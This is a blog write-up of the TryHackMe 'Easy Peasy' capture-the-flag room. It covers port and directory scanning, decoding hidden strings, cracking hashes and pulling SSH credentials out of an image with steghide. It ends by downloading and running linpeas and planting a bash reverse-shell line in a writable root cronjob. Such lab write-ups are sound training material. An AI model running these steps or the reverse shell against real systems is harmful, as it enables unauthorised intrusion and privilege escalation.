<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>THM | Easy Peasy | Adam Holst</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="THM Easy Peasy" /><meta name="author" content="Harambe" /><meta property="og:locale" content="en_US" /><meta name="description" content="Description: The following post is writeup of the Easy Peasy room from tryhackme" /><meta property="og:description" content="Description: The following post is writeup of the Easy Peasy room from tryhackme" /><link rel="canonical" href="https://adamholst.github.io/posts/THM-Easy-Peasy/" /><meta property="og:url" content="https://adamholst.github.io/posts/THM-Easy-Peasy/" /><meta property="og:site_name" content="Adam Holst" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-19T06:00:00-05:00" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@type":"BlogPosting","description":"Description: The following post is writeup of the Easy Peasy room from tryhackme","mainEntityOfPage":{"@type":"WebPage","@id":"https://adamholst.github.io/posts/THM-Easy-Peasy/"},"author":{"@type":"Person","name":"Harambe"},"headline":"THM Easy Peasy","url":"https://adamholst.github.io/posts/THM-Easy-Peasy/","dateModified":"2020-08-19T06:00:00-05:00","datePublished":"2020-08-19T06:00:00-05:00","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/hypers2.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Adam Holst</a></div><div class="site-subtitle font-italic">wannabe security guy</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/adamholst" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['AdamHolst','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>THM | Easy Peasy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>THM | Easy Peasy</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 19, 2020, 6:00 AM -0500" > Aug 19 <i class="unloaded">2020-08-19T06:00:00-05:00</i> </span> by <span class="author"> Harambe </span></div></div><div class="post-content"><h2 id="description">Description:</h2><p>The following post is writeup of the Easy Peasy room from tryhackme</p><ul><li>https://tryhackme.com/room/easypeasyctf</li><li><em>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</em></li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/flqWogA.png" alt="" /></p><h1 id="task-1">Task 1</h1><h2 id="11---how-many-ports-are-open">1.1 - How many ports are open?</h2><p>Start with basic information gathering techniques. For CTF’s, I like to scan all 65,535 ports because it’s common for the creator to use unconventional ports. So, to start my scans I use a Python script that just simply scans all the ports to see if they are open or closed, nothing more, and uses 400 threads to make it go much faster. Then I use nmap on just those ports to enumerate more information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/NsKRs6y.png" alt="" /></p><p>Some weird ports were indeed being used, but this script makes the process easy peasy.</p><h2 id="12---what-is-the-version-of-nginx">1.2 - What is the version of nginx?</h2><p>Now it’s time to enumerate for all the good information with nmap’s greatness.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ nmap -A -p80,6498,65524 10.10.206.240
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:58 CDT
Nmap scan report for 10.10.206.240
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
</pre></table></code></div></div><h2 id="13---what-is-running-on-the-highest-port">1.3 - What is running on the highest port?</h2><p>All the info we need for this task is in the nmap output. With this method of scanning, I was able to finish this task in less than a minute.</p><h1 id="task-2">Task 2</h1><h2 id="21---using-gobuster-find-flag-1">2.1 - Using GoBuster, find flag 1.</h2><p>With there being two http ports open on the server there could be a lot of scanning and waiting so let’s just start with the nginx server on port 80.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://10.10.206.240 -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 200
</pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th style="text-align: center">Argument<th style="text-align: center">Description<tbody><tr><td style="text-align: center">dir<td style="text-align: center">Uses directory/file brutceforcing mode<tr><td style="text-align: center">-u<td style="text-align: center">The URL to bruteforce<tr><td style="text-align: center">-w<td style="text-align: center">Path to the wordlist<tr><td style="text-align: center">-t<td style="text-align: center">Number of concurrent threads</table></div><p>Within a few seconds gobuster outputs a directory named <strong>/hidden</strong></p><p>The page is just an image with no links or text that I could see, so I went to look at the source code:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Welcome to ctf!<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;</span>
<span class="nt">body</span> <span class="p">{</span>
<span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("https://cdn.pixabay.com/photo/2016/12/24/11/48/lost-places-1928727_960_720.jpg")</span><span class="p">;</span>
<span class="nl">background-repeat</span><span class="p">:</span> <span class="nb">no-repeat</span><span class="p">;</span>
<span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span>
<span class="nl">width</span><span class="p">:</span> <span class="m">35em</span><span class="p">;</span>
<span class="nl">margin</span><span class="p">:</span> <span class="m">0</span> <span class="nb">auto</span><span class="p">;</span>
<span class="nl">font-family</span><span class="p">:</span> <span class="n">Tahoma</span><span class="p">,</span> <span class="n">Verdana</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>I downloaded the image and did some basic stego on it, but turned out to be a dead in. Maybe a rabbit hole? I went to scan the apache port next, but then I realized to scan the /hidden directory itself since gobuster does not scan recursively. Turned out to be correct, gobuster found <strong>/hidden/whatever</strong></p><p>It’s another blank page with just an image, but the source code is more helpful here:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>dead end<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;</span>
<span class="nt">body</span> <span class="p">{</span>
<span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg")</span><span class="p">;</span>
<span class="nl">background-repeat</span><span class="p">:</span> <span class="nb">no-repeat</span><span class="p">;</span>
<span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span>
<span class="nl">width</span><span class="p">:</span> <span class="m">35em</span><span class="p">;</span>
<span class="nl">margin</span><span class="p">:</span> <span class="m">0</span> <span class="nb">auto</span><span class="p">;</span>
<span class="nl">font-family</span><span class="p">:</span> <span class="n">Tahoma</span><span class="p">,</span> <span class="n">Verdana</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;center&gt;</span>
<span class="nt">&lt;p</span> <span class="na">hidden</span><span class="nt">&gt;</span>ZmxhZ3tmMXJzN19mbDRnfQ==<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>There’s something encoded in the hidden paragraph tag, almost certain it’s base64 so I decode it from my terminal.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{*redacted*} 
</pre></table></code></div></div><p>Finally, first flag.</p><h2 id="22---further-enumerate-the-machine-what-is-flag-2">2.2 - Further enumerate the machine, what is flag 2?</h2><p>Okay, it’s finally time to check out the other web server on port 65524. It’s an apache default page. If you have some good eyes you will notice something different about it though. In the middle on the page, in plain text, is the third flag. Just remember it for later.</p><p>If you remember from the nmap scan, there’s a robots.txt file on this port. Here’s what it contains:</p><blockquote><p>User-Agent:* Disallow:/ Robots Not Allowed User-Agent:a18672860d0510e5ab6699730763b250 Allow:/ This Flag Can Enter But Only This Flag No More Exceptions</p></blockquote><p>When I first saw this, I thought I had it all figured out, I’ll set my User-Agent field in my header to match the given value. That didn’t seem to really do anything though and I spent a lot of time here actually just trying to make sense of this.</p><p>Turns out that value for the User-Agent is a md5 hash, so it’s time to get to cracking. I like using <a href="https://md5hashing.net/">md5hashing.net</a> or some other sites that do the same thing. I’ve moved away from cracking on my personal machine and using these type of sites instead. (only for CTFs)</p><blockquote><p><em>Pro Tip: For CTFs, it’s good to just paste the hash into google by itself and see if someone else has done the work already lol</em></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/FXitiMl.png" alt="" /></p><p>So there’s the second flag in plain text from a google search.</p><h2 id="23---crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 - Crack the hash with easypeasy.txt, What is the flag 3?</h2><p>The room has a download button for the easypeasy.txt file. It’s a much smaller version of rockyou.txt (5140 lines). If you remember from above, there is a flag in the text of the home page on the apache server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/ZpJA51M.png" alt="" /></p><p>Well, the format the flag is in from the webpage is a md5 hash and this is the correct answer as is, so there’s nothing more to be done. I cracked the hash with the site from earlier. Maybe this wasn’t intended? Who knows.</p><h2 id="24---what-is-the-hidden-directory">2.4 - What is the hidden directory?</h2><p>There’s more information hidden in the source code of the apache page:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"main_page"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"page_header floating_element"</span><span class="nt">&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"[/icons/openlogo-75.png](http://10.10.206.240:65524/icons/openlogo-75.png)"</span> <span class="na">alt=</span><span class="s">"Debian Logo"</span> <span class="na">class=</span><span class="s">"floating_element"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"floating_element"</span><span class="nt">&gt;</span>
Apache 2 It Works For Me
<span class="nt">&lt;p</span> <span class="na">hidden</span><span class="nt">&gt;</span>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></table></code></div></div><p>Another hidden message in a paragraph tag and gives a good clue as well. It’s encoded with some kind of base. For this kind of trial and error type of stuff I love using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>. This is one of the best browser tools I’ve come across, it has a ton of versatility.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/YI0gIu0.png" alt="" /></p><p>CyberChef shows that it’s base62 and the directory name is <strong>/n0th1ng3ls3m4tt3r</strong></p><h2 id="25---using-the-wordlist-that-is-provided-to-you-in-this-task-crack-the-hash-what-is-the-password">2.5 - Using the wordlist that is provided to you in this task crack the hash what is the password?</h2><p>So, going to the new directory we found there’s a hash and an image on the page. The question let’s you know what you need to do, figuring out what the hash algorithm is, is the challenge.</p><p>Another reason I like using <a href="https://md5hashing.net/">md5hashing.net</a> is that there is an option to use all hash types if you’re not sure what algorithm your hash is.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/WK1Ohrd.png" alt="" /></p><p>In a few minutes the hash was cracked and revealed that is was a GOST hash.</p><h2 id="26---what-is-the-password-to-login-to-the-machine-via-ssh">2.6 - What is the password to login to the machine via SSH?</h2><p>Now that we have this password, let’s do some stego on the image that was on the page. Download the image and run steghide on it to extract the hidden file. When asked for the password use the cracked hash from above.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ steghide --extract -sf binarycodepixabay.jpeg
Enter passphrase: 
wrote extracted data to "secrettext.txt".

</pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th style="text-align: center">Argument<th style="text-align: center">Description<tbody><tr><td style="text-align: center">- -extract<td style="text-align: center">extract data<tr><td style="text-align: center">-sf<td style="text-align: center">extract data from &lt; filename &gt;</table></div><p>steghide extracts a .txt file so let’s see what’s inside of it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/1gK9Pna.png" alt="" /></p><p>The file has a username and password, but the password is in binary. Again, I used CyberChef to quickly decode it. After that, we have a clear text password. Finally, we have login credentials for SSH.</p><h2 id="27---what-is-the-user-flag">2.7 - What is the user flag?</h2><p>Login with the new creds and remember SSH is on port 6498 so add the -p flag when logging in.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/HNuI7ks.png" alt="" /></p><p>The boring user has access to the user flag, but like the hint says, it’s rotated. So once again I used CyberChef to try a ROT13 decode with the flag. That worked perfect and we have the correct flag now.</p><h2 id="28---what-is-the-root-flag">2.8 - What is the root flag?</h2><p>The final task, escalate our privileges and get the root flag. Since I have the password for the current user, I will check their sudo permissions.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>boring@kral4-PC:~$ sudo -l
[sudo] password for boring: 
Sorry, user boring may not run sudo on kral4-PC.
</pre></table></code></div></div><p>No luck with that, so I’m going to upload a script that is very helpful for enumerating information to priv esc. I always use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a>, first I’m going to check for the wget binary so I can download it to the target machine from my machine hosting the file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>boring@kral4-PC:~$ which wget
/usr/bin/wget
boring@kral4-PC:~$ ls -la /usr/bin/wget 
-rwxr-xr-x 1 root root 499264 Apr  8  2019 /usr/bin/wget

</pre></table></code></div></div><p>Okay perfect, so now I’ll spin up a webserver on my machine hosting the file and use wget to download it to the target machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(adam㉿Harambe)-[~/thm/easy-peasy/www]
└─$ sudo python3 -m http.server 80
[sudo] password for adam: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th style="text-align: center">Argument<th style="text-align: center">Description<tbody><tr><td style="text-align: center">-m<td style="text-align: center">run library module as a script<tr><td style="text-align: center">http.server<td style="text-align: center">built in module to create a webserver<tr><td style="text-align: center">80<td style="text-align: center">Uses port 80 (default is 8000)</table></div><p>I always use the /dev/shm directory when I do this because I know I will have permissions there. So go there and download the file then run it. Don’t forget to make it executable.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>boring@kral4-PC:/dev/shm$ wget http://10.6.11.75/linpeas.sh
--2020-08-20 12:41:38--  http://10.6.11.75/linpeas.sh
Connecting to 10.6.11.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 229696 (224K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                              100%[============================================================================&gt;] 224.31K   306KB/s    in 0.7s    

2020-08-20 12:41:39 (306 KB/s) - ‘linpeas.sh’ saved [229696/229696]
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>boring@kral4-PC:/dev/shm$ chmod +x linpeas.sh &amp;&amp; ./linpeas.sh 
</pre></table></code></div></div><p>linpeas does its magic and finds a cronjob running as root.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/PZPCOrn.png" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>boring@kral4-PC:/dev/shm$ cd /var/www/
boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15 12:59 .
drwxr-xr-x 14 root   root   4096 Jun 13 15:55 ..
drwxr-xr-x  4 root   root   4096 Jun 15 00:58 html
-rwxr-xr-x  1 boring boring   33 Jun 14 22:43 .mysecretcronjob.sh
</pre></table></code></div></div><p>Yeah I think we’ve found the priv esc. So the easiest way of going about this is to set up a nc listener and just connect to it with a bash command in the script. You don’t even need to put the listener on your attacking machine, just use the localhost address. Edit the script with the following:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/127.0.0.1/9001 0&gt;&amp;1
</pre></table></code></div></div><p>Now just set up a listener on the port and become root.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://imgur.com/GuH6KW5.png" alt="" /></p><p>And that’s it, machine rooted.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/thm/'>THM</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/gobuster/" class="post-tag no-text-decoration" >gobuster</a> <a href="/tags/steghide/" class="post-tag no-text-decoration" >steghide</a> <a href="/tags/cyberchef/" class="post-tag no-text-decoration" >cyberchef</a> <a href="/tags/linpeas/" class="post-tag no-text-decoration" >linpeas</a> <a href="/tags/cronjob/" class="post-tag no-text-decoration" >cronjob</a> <a href="/tags/gost/" class="post-tag no-text-decoration" >gost</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM | Easy Peasy - Adam Holst&url=https://adamholst.github.io/posts/THM-Easy-Peasy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab 